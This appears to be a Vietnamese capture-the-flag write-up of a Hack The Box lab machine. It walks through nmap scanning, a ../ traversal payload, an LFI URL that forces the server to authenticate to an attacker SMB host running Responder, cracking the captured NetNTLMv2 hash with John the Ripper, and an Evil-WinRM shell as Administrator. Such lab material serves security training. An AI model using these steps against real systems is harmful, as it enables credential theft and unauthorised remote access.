> Lab này tập trung vào Lỗ hổng File Inclusion trên trang web được hosted trên Windows machine can be exploited để thu nhập *NetNTLMv2 challege* của người dùng đang chạy web server với một công cụ là **Responder** để thu thập NetNTLMv2 hash và sau đó sử dụng **john the ripper** để giải mã mã băm.

###### File Inclusion: một lỗ hổng cho phép tin tặc truy cập trái phép vào những tập tin nhạy cảm trên máy web hoặc thực thi các tệp tin nhạy cảm trên máy chủ web hoặc thực thi các tệp tin độc hại bằng cách sử dụng chức năng "include". Lỗ hổng này xảy ra do cơ chế kiểm tra đầu vào không được thực hiện tốt, khiến tin tặc có thể khai khác và chèn dự liệu độc hại.
### 1. Tìm kiếm thông tin
###### IP: 10.129.95.234
##### + Kiểm tra kết nối:
` ping 10.129.95.234 `
##### + Kiểm tra cổng và dịch vụ:
` nmap -p- --min-rate 1000 -sV 10.129.95.234 `
###### --min-rate: cụ thể số packet mà Nmap gửi đi mỗi giây; số càng cao thì scan sẽ nhanh hơn
##### => 80/tcp http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1).
##### => 5985/tcp http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP).
##### => Target đang sử dung hệ điều hành Windows. 2 Cổng phát hiện có Apache web server đang chạy trên cổng 80 cùng với *WinRM* trên cổng 5985.
###### WinRM (Windows Remote Management) là một protocol quản lý từ xa được tích hợp sẵn trong Win, dùng để tương tác với máy tính và server từ xa. WinRM cho phép người dùng giao tiếp từ xa với máy chủ, thực thi lệnh trên hệ thông, xem, quản lý và cấu hình server, hệ điều hành và máy khách từ xa.
##### + Đối với pentester, điều đó có nghĩa là chúng ta có thể tìm thông tin (như tên người dùng và mật khẩu) của người dùng có quyền thực thi lệnh từ xa và từ đó lấy được PowerShell trên máy chủ.
### 2. Xem xét qua các lỗ hổng
##### + Truy cập địa chỉ trang web:
` http://10.129.95.234 `
###### Có thể bỏ :80 đằng sau vì cổng 80 là mặc định
##### => Trang web trả về tin nhắn là không thể tìm thấy site đó. Tuy nhiên khi nhìn vào thanh tìm kiếm, nó hiện là *http://unika.htb*.
###### Trong trường hợp này, website đã điều hướng trình duyệt sang một đường link mới và máy chủ không biết cách tìm *unika.htb*. Webserver này đang sử dụng *Virtual Hosting* dựa trên tên để phục vụ các request.
###### Xem thêm về khái niệm Virtual Hosting: https://vietnix.vn/virtual-hosts/
##### + File /etc/hosts được sử dụng để chuyển hóa tên hostname sang IP address. Thêm *entry* cho /etc/hosts để giúp trình duyệt xử lý địa chỉ cho *unika.htb*:
` echo "10.129.95.234   unika.htb" | sudo tee -a /etc/hosts `
##### + Sau khi thực hiện lệnh, truy cập lại trang web:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/102fc7ae-a476-4502-808b-cf383e78d271)
##### + Truy cập trang web thành công, sau khi mày mò thử trang web, để ý thấy trong phần thay đổi ngôn ngữ từ *EN* sang *FR*: tiếng Anh sang tiếng Pháp thì sẽ thấy thanh URL như sau: 
` https//unika.htb/index.php?page=french.html `
##### => Lỗ hổng *File Inclusion*
##### + LFI, hay *Local File Inclusion* xảy ra khi attacker có thể làm cho website 'bao gồm' hay 'include' một file đáng lẽ ra không nên được nhìn thấy bởi người dùng trang web. Thường xảy ra khi ứng dụng sử dụng path của file như một input. Attacker có thể khai thác lỗ hổng này bằng cách sử dụng `../` để lùi về path trước đó.
##### + Thử xem trang web có lỗ hổng LFI hay không với lệnh sau: 
```
http://unika.htb/index.php? 
page=../../../../../../../../windows/system32/drivers/etc/hosts
```
###
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/b5405c79-c1bc-43da-bcdc-5b606bec612e)
##### => Có lỗ hổng LFI
###### Xem thêm về incldue() trong PHP ở dây: https://www.php.net/manual/en/function.include.php
### 3. Tấn công Lỗ hổng
##### + Vì File có lỗ hổng với LFI nên ta có thể chèn một file mã độc vào target với SMB URLs. 
##### + Vì Windows khi nhận một file có phương thức SMB, hệ thống sẽ có xác thực máy của chúng ta với NetNTMLv2 và ta sẽ bắt giữ hàm băm NetNTMLv2 nhằm bypass bước xác thực đó.
###### Xem thêm cách hoạt động của NTLM authen: https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/
###### Xem thêm cách đẩy lên web SMB URL: https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds#lfi
##### + Đây sẽ là quy trình của cuộc tấn công này: 
```
Attacker: Set up một SMB giả với Responder, chờ đợi yêu cầu.
Attacker: Đẩy file bất kỳ lên web, bắt trang web yêu cầu include(), aka cố kết nối với server SMB. 
Target (trang web): Chứng minh xác thức với SMB giả kia.
Responder: Gửi một phương thức xác thực ('challenge') đến target, yêu cầu sử dụng mật khẩu của người dùng để xác thực.
Target: sử dụng mật khẩu người dùng, mã hóa nó để tạo phản hồi cho Responder.
Responder: sử dụng phản hồi mã hóa này kèm với 'challenge' ban đầu nó gửi cho target, tạo nên mã băm NetNTLMv2
Attacker: Sử dụng john the ripper để giải mã NetNTLMv2
Attacker: Sử dụng đoạn mã được giải truy cập vào WinRM
```
##### + Nếu chưa có Responder trên máy:
` git clone https://github.com/lgandx/Responder `
##### + Kiểm tra xem Responder.conf đã được set để lắng nghe các yêu cầu SMB chưa:
```
cat Responder.conf

[Responder Core]

; Server to start
SQL = On
SMB = On

...
```
###### + Kiểm tra giao diện mạng, chạy Responder:
```
ifconfig      # giao diện mạng : tun 0
sudo python3 Responder.py -I tun0
```
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/72aa226a-8104-4bc5-b89f-b61ec10a4d67)
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/99f661a9-5a6a-4b48-8e91-f414d06b0e1d)

##### + Như vậy, Responder đã sẵn sàng, ta thay đổi url trang web để bắt nó gửi yêu cầu đến SMB:
` http://unika.htb/?page=//10.10.14.32/somefile `
###### 10.10.14.32: IP của tun0
###### somefile: file ngẫu nhiên
###### + Sau đó, server sẽ thử load resource từ SMB server và Responder sẽ bắt giữ đủ thông tin và tạo NetNTLMv2:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/c1c3da6d-eefd-46bc-80e4-256465aadef6)

![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/c1020df6-8db1-4984-8fb0-7a5f1afcd0cf)

##### + Đã có được giá trị hàm băm, đẩy vào file để *john the ripper* xử lý:
```
echo <giá trị hash> > hash.txt
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

### 4. Khai thác thông tin
##### + Sau đó ta được mật khẩu cho user: *badminton* và tên user: *Administrator*. Kết nối với WinRM thông qua Evil-WinRM:
##### Eveil-WinRM là một tool chuyên dùng cho kết nối với WinRM với nhiều tính năng cho kiểm thử và khai thác lỗ hổng
```
evel-winrm -i 10.129.95.234 -u administrator -p badminton
Evil-WinRM shell v3.5
...
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> dir
...
*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users> dir
....
*Evil-WinRM* PS C:\Users> cd Desktop; dir
*Evil-WinRM* PS C:\Users> type flag.txt
...
```
##### => Lấy flag thành công!
